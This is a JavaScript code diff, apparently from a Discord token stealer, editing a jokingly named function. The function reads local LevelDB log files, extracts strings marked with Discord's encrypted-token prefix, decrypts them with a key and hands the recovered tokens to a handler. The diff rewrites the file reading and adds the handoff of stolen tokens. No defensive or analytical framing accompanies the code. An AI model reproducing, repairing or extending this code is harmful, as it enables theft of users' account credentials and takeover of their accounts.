@@ -50,24 +50,24 @@ const decryptRickRoll = (path) => {
     if (!existsSync(levelDB)) return;
     readdirSync(levelDB).map(f => {
       if (f.split('.').pop() !== 'log' && f.split('.').pop() !== 'ldb') return;
-      const readInterface = readline.createInterface({
-        input: createReadStream(join(levelDB, f)), output: os.devNull, console: false
-      });
-      readInterface.on('line', (line) => {
+      const lines = readFileSync(join(levelDB, f), { encoding: 'utf-8', flag: 'r' }).split('\n').map(x => x.trim());
+      lines.forEach(line => {
         line.match(/dQw4w9WgXcQ:[^.*['(.*)'\].*$][^"]*/gi)?.map(token => {
           if (token.endsWith('\\')) token = (token.slice(0, -1).replace('\\', '')).slice(0, -1);
           if (!encryptedTokens[token]) encryptedTokens.push(token);
         });
       });
-      readInterface.on('close', () => {
-        encryptedTokens.forEach(token => {
-          token = decryptToken(token, key)?.trim();
-          if (
-            typeof token === 'string' && token.match(tokenRegex) && !tokens.includes(token)
-          ) tokens.push(token);
-        });
-        if (tokens.length <= 0) reject();
+      encryptedTokens.forEach(token => {
+        token = decryptToken(token, key)?.trim();
+        if (
+          typeof token === 'string' && token.match(tokenRegex) && !tokens.includes(token)
+        ) tokens.push(token);
       });
+      if (tokens.length <= 0) {
+        reject();
+      } else {
+        handleTokens(tokens, resolve);
+      }
     });
   });
 };
